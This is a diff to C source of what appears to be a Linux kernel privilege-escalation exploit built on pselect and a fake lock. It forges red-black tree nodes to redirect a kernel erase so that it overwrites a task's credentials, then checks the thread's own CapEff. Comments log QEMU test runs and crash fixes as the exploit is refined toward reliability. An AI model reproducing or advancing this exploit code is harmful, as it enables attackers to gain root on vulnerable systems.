@@ -564,7 +564,14 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
          * shape uses for delivery: erase unlinks ghost from parent
          * (store *(parent+8)=cred = the delivery), root stays = parent,
          * requeue reinserts under the parent — tree consistent. */
-        ex_stamp[1] = (uint64_t)g_cc_parent; /* word11 root = fake parent */
+        /* ROOT = fake_w0 (QEMU-proven fix: requeue insert walks the root
+         * — root=parent/ghost crashed at rb_insert_color+0x48 walking
+         * garbage. fake_w0 = page node, pc=0 black, children NULL →
+         * erase is parented (delivery via change_child *(task+0x780)
+         * = VALUE, root untouched), then the insert links ghost under
+         * fake_w0's empty child slot and insert_color sees a BLACK
+         * parent → terminates instantly. All reads/writes on page. */
+        ex_stamp[1] = (uint64_t)fake_w0;
         ex_stamp[2] = g_ghost_kva;  /* word12 leftmost = ghost (top)   */
         /* owner MUST be >1: the chain exits at owner<=1 BEFORE the
          * delivery erase (historic util.c note: "exits at owner<=1
@@ -2805,7 +2812,14 @@ void do_pselect_fake_lock_route(void) {
     /* WAITER SELF-VERIFICATION (delivery readback): this thread is the
      * punch target under MODE4_TARGET_WAITER — if the erase delivered,
      * OUR OWN CapEff changed. Direct, no child-task dependency. */
-    if (env_flag("MODE4_TARGET_WAITER", 0)) {
+    if (env_flag("MODE4_TARGET_WAITER", 0) &&
+        env_flag("MODE4_WAITER_HOLD", 1)) {
+      /* RUN 5: HOLD alive post-punch - sched_yield only (proven
+       * safe: run 4 waiter survived writes; runs 2/3 died on the
+       * status RENDER). Main renders this thread cred while held. */
+      struct timespec hs = {10, 0};
+      nanosleep(&hs, NULL);  /* deterministic 10s hold: no cred touch */
+    } else if (env_flag("MODE4_WAITER_READBACK", 0)) {
       int sf = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
       if (sf >= 0) {
         static char sb[2048];
